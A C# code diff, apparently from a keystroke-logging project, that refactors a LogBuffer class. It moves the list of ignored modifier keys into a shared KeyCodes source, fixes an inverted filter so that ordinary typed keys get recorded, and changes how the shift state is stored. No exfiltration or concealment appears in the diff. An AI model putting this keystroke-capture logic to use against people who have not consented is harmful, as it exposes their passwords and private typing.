@@ -1,6 +1,5 @@
 ﻿using System.Collections.Generic;
 using System.Linq;
-using System.Windows.Forms;
 using wls.LogItems;
 
 namespace wls.Buffer
@@ -13,19 +12,14 @@ namespace wls.Buffer
         private bool _altPrev;
         private bool _capsPrev;
 
-        private readonly int[] _ignoreKeys =
-                {
-                    (int) Keys.ControlKey,
-                    (int) Keys.ShiftKey,
-                    (int) Keys.CapsLock,
-                    (int) Keys.Menu
-                };
+        private readonly int[] _ignoreKeys;
 
         private readonly IBufferProcessor _bufferProcessor;
 
         public LogBuffer(IBufferProcessor bufferProcessor)
         {
             _bufferProcessor = bufferProcessor;
+            _ignoreKeys = KeyCodes.Instance.IgnoreKeys();
         }
         public void Add(IList<int> keys)
         {
@@ -55,13 +49,14 @@ namespace wls.Buffer
             if (keys == null || keys.Count == 0) return;
 
             bool shift = KbApiWrapper.ToggleKeys.Shift;
-            bool upper = (shift && !caps) || (!shift && caps);
+            
             int keyboardLayout = KbApiWrapper.GetKeyboardLayout();
-            // ignore the keys which are logged above
-            var filteredKeys = keys.Where(r => _ignoreKeys.Contains(r));
+            // exclude the keys defined in Ignore section
+            var filteredKeys = keys.Where(r => !_ignoreKeys.Contains(r));
+
             foreach (int key in filteredKeys)
             {
-                _logItems.Add(new LogKey(key, keyboardLayout, upper));
+                _logItems.Add(new LogKey(key, keyboardLayout, shift));
             }
         }
 
